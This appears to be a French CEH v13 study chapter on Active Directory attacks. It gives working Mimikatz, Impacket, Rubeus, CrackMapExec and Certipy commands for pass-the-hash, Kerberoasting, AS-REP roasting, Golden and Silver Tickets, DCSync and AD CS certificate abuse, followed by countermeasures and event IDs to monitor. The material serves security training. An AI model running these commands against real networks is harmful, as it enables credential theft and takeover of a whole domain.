# 🏢 09 — Attaques Active Directory (CEH v13)

> **CEH v13 | Module 6** | [← Retour au sommaire](./README.md)

---

## 📖 Pourquoi Active Directory ?

Active Directory (AD) est le **cœur de l'infrastructure réseau** de la quasi-totalité des entreprises Windows. Le compromettre signifie compromettre **tout le réseau**.

```
Active Directory contrôle :
├─ Authentification de tous les utilisateurs
├─ Autorisation d'accès aux ressources
├─ Configuration de toutes les machines (GPO)
├─ Gestion des certificats (AD CS)
└─ DNS interne de l'entreprise
```

> 📌 **CEH v13** : Section Active Directory renforcée — reflète la réalité des pentest modernes où AD est la cible principale.

---

## 🔄 Rappel Kerberos pour les attaques AD

```
Client → AS-REQ (credentials) → KDC/DC
       ← AS-REP (TGT chiffré avec krbtgt hash) ←
       → TGS-REQ (TGT + service demandé) →
       ← TGS-REP (Service Ticket chiffré avec hash du compte service) ←
       → Service Ticket → Service cible
```

**Clés importantes :**
- `krbtgt` : compte qui signe tous les TGT → compromission = Golden Ticket
- Hash du compte de service : signe les Service Tickets → Kerberoasting
- NTLM hash de n'importe quel compte → Pass-the-Hash

---

## 🎫 Pass-the-Hash (PtH)

```
Hash NTLM obtenu via Mimikatz/secretsdump
         ↓
Utilisation directe sans craquer le mot de passe
         ↓
Authentification NTLM à distance
         ↓
Accès aux ressources de l'utilisateur compromis
```

```bash
# Mimikatz — dump + PtH
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# → Récupère NTLM : fc525c9683e8fe067095ba2ddc971889

# PtH avec Mimikatz → ouvre cmd.exe avec le contexte Admin
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP.LOCAL /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:cmd.exe

# PtH avec Impacket (Linux → Windows)
python3 psexec.py -hashes :fc525c9683e8fe067095ba2ddc971889 Administrator@10.10.10.10

# PtH avec CrackMapExec (mouvement latéral sur tout le réseau)
crackmapexec smb 192.168.1.0/24 -u Administrator -H fc525c9683e8fe067095ba2ddc971889 --local-auth

# PtH avec evil-winrm
evil-winrm -i 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889
```

---

## 🎟️ Pass-the-Ticket (PtT)

Utilise un **ticket Kerberos** (TGT ou TGS) volé pour s'authentifier.

```bash
# Mimikatz — extraire les tickets Kerberos
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
# → Crée des fichiers .kirbi (tickets Kerberos)

# Injecter le ticket dans la session courante
mimikatz # kerberos::ptt administrator@krbtgt-CORP.LOCAL.kirbi

# Vérifier le ticket injecté
klist

# Accéder aux ressources avec le ticket
dir \\DC01\C$
```

---

## 🔓 Kerberoasting

**Principe** : Tout utilisateur du domaine peut demander un Service Ticket pour n'importe quel service. Ce ticket est chiffré avec le **hash NTLM du compte de service**. L'attaquant peut le craquer offline.

```
Attaquant (user AD standard)
         ↓ TGS-REQ pour SPN de service
KDC
         ↓ TGS-REP (ticket chiffré avec hash compte service)
Attaquant
         ↓ Crackage offline du ticket (Hashcat)
         ↓ Mot de passe du compte service obtenu
```

```bash
# Étape 1 : Lister les SPNs (Service Principal Names)
# PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# setspn
setspn -T CORP.LOCAL -Q */*

# Étape 2 : Demander les tickets via Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Via Impacket (depuis Linux)
python3 GetUserSPNs.py CORP.LOCAL/normaluser:Password123 -dc-ip 10.10.10.1 -request

# Étape 3 : Craquer avec Hashcat
hashcat -m 13100 hashes.txt rockyou.txt   # TGS-REP etype 23
```

---

## 👻 AS-REP Roasting

Similaire au Kerberoasting mais cible les comptes **sans pré-authentification Kerberos requise**.

```
Comptes vulnérables = "Do not require Kerberos preauthentication" coché

Attaquant → AS-REQ sans credentials →
KDC → AS-REP avec partie chiffrée par le hash du compte
Attaquant → Crack offline
```

```bash
# Impacket (depuis Linux)
python3 GetNPUsers.py CORP.LOCAL/ -usersfile users.txt -dc-ip 10.10.10.1 -no-pass -format hashcat

# Rubeus (depuis Windows)
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Craquer avec Hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt   # AS-REP etype 23
```

---

## 🥇 Golden Ticket Attack

Le **Golden Ticket** est un TGT forgé en utilisant le **hash NTLM du compte krbtgt**.  
Il permet d'accéder à **n'importe quelle ressource du domaine** pendant 10 ans (durée par défaut).

```
Condition : Hash du compte krbtgt (obtenu via DCSync ou Domain Admin)

Golden Ticket = TGT forgé signé avec le hash krbtgt
→ Le KDC ne peut PAS vérifier si ce ticket est légitime
→ Accès à TOUT le domaine, pour TOUJOURS (jusqu'au changement 2x du krbtgt)
```

```bash
# Étape 1 : Obtenir le hash krbtgt (DCSync - nécessite Domain Admin)
mimikatz # lsadump::dcsync /domain:CORP.LOCAL /user:krbtgt
# → Récupère : Hash NTLM, SID du domaine

# Étape 2 : Créer le Golden Ticket
mimikatz # kerberos::golden /user:Administrateur /domain:CORP.LOCAL /sid:S-1-5-21-1234567890-123456789-1234567890 /krbtgt:krbtgt_NTLM_hash /id:500

# Étape 3 : Injecter le ticket
mimikatz # kerberos::ptt ticket.kirbi

# Maintenant → accès à tout le domaine
dir \\DC01\C$
psexec \\DC01 cmd.exe
```

---

## 🥈 Silver Ticket Attack

Le **Silver Ticket** est un Service Ticket forgé pour **un service spécifique**.  
Moins puissant que Golden Ticket mais **ne communique pas avec le KDC** → plus discret.

```bash
# Créer un Silver Ticket pour le service CIFS (partage de fichiers)
mimikatz # kerberos::golden /user:Administrateur /domain:CORP.LOCAL /sid:S-1-5-21-... /target:DC01.CORP.LOCAL /service:cifs /rc4:service_account_NTLM_hash

# Accéder au service
dir \\DC01\C$
```

---

## 📡 DCSync Attack

Simule le comportement d'un **contrôleur de domaine** pour répliquer les hashes de tous les utilisateurs depuis NTDS.dit.

```bash
# Via Mimikatz (nécessite droits de réplication = Domain Admin)
mimikatz # lsadump::dcsync /domain:CORP.LOCAL /all /csv

# Dump d'un utilisateur spécifique
mimikatz # lsadump::dcsync /domain:CORP.LOCAL /user:Administrator

# Via secretsdump.py (Impacket)
python3 secretsdump.py CORP.LOCAL/DomainAdmin:Password@DC01.CORP.LOCAL

# Via CrackMapExec
crackmapexec smb DC01.CORP.LOCAL -u DomainAdmin -p Password --ntds
```

---

## 🔍 Énumération AD avec BloodHound

**BloodHound** analyse les relations dans AD pour trouver des **chemins d'attaque** vers Domain Admin.

```bash
# Collecte des données (SharpHound — depuis Windows)
SharpHound.exe -c All --outputdirectory C:\temp

# Ou via BloodHound.py (depuis Linux)
python3 bloodhound.py -u normaluser -p Password123 -d CORP.LOCAL -dc DC01.CORP.LOCAL -c all

# Lancer BloodHound
neo4j start
bloodhound

# Requêtes utiles dans BloodHound :
# "Find Shortest Paths to Domain Admins"
# "Find Principals with DCSync Rights"
# "Find AS-REP Roastable Users"
# "Find Kerberoastable Users with most privileges"
```

---

## 📜 Attaques AD CS (Certificate Services)

> Section nouvelle CEH v13 — attaques sur les services de certificats AD

### ESC1 — Enrollement arbitraire + SAN

```bash
# Trouver les templates vulnérables avec Certipy
certipy find -username normaluser@CORP.LOCAL -password Password123 -dc-ip 10.10.10.1

# Demander un certificat avec un SAN (Subject Alternative Name) arbitraire
certipy req -username normaluser@CORP.LOCAL -password Password123 \
  -ca CORP-CA -template VulnerableTemplate \
  -upn administrator@CORP.LOCAL

# S'authentifier avec le certificat
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

---

## 🛡️ Défenses contre les attaques AD

| Attaque | Contre-mesure |
|---------|---------------|
| **Pass-the-Hash** | Credential Guard, Protected Users group, désactiver NTLM |
| **Kerberoasting** | Mots de passe longs (25+ chars) pour comptes de service, Microsoft MSA/gMSA |
| **AS-REP Roasting** | Activer la pré-authentification pour tous les comptes |
| **Golden Ticket** | Changer le krbtgt 2x, surveiller les tickets anormaux |
| **Silver Ticket** | Activer PAC validation, surveiller les accès de service |
| **DCSync** | Limiter les droits de réplication, surveiller les requêtes DRS |
| **BloodHound** | Nettoyer les permissions excessives, Tier Model |
| **AD CS** | Désactiver les templates vulnérables, auditer régulièrement |

### Bonnes pratiques AD

```
✅ Implémenter le modèle de niveaux (Tier 0/1/2)
   Tier 0 : Domain Controllers, AD CS, krbtgt
   Tier 1 : Serveurs applicatifs
   Tier 2 : Workstations utilisateurs

✅ Utiliser des Privileged Access Workstations (PAW)
✅ Activer Protected Users Security Group pour les comptes admin
✅ Désactiver NTLM si possible (utiliser uniquement Kerberos)
✅ Activer Windows Defender Credential Guard
✅ Surveiller les Event IDs AD critiques :
   - 4768 : TGT request (Kerberos)
   - 4769 : Service ticket request (Kerberoasting)
   - 4776 : NTLM authentication
   - 4662 : Operation on AD object (DCSync)
✅ Déployer Microsoft ATA ou Defender for Identity
✅ Renouveler le mot de passe krbtgt régulièrement (2x consécutifs)
✅ Auditer les AD CS templates régulièrement
✅ Utiliser LAPS pour les comptes admin locaux
```

---

## 🎯 Synthèse des attaques AD

```
┌──────────────────────────────────────────────────────────────────┐
│                CHEMIN D'ATTAQUE TYPIQUE VERS DA                  │
│                                                                  │
│  Accès initial (phishing, vuln exploitation)                     │
│          ↓                                                       │
│  Énumération AD (BloodHound, ldapsearch)                        │
│          ↓                                                       │
│  Kerberoasting / AS-REP Roasting → credentials                  │
│          ↓                                                       │
│  Lateral movement (PtH, PtT, CrackMapExec)                     │
│          ↓                                                       │
│  Accès serveur avec droits élevés → Mimikatz                    │
│          ↓                                                       │
│  DCSync → hash krbtgt + tous les comptes                        │
│          ↓                                                       │
│  Golden Ticket → DOMAIN ADMIN permanent                         │
└──────────────────────────────────────────────────────────────────┘
```

---

[← Covering Tracks](./08-covering-tracks.md) | [↑ Retour au sommaire](./README.md)
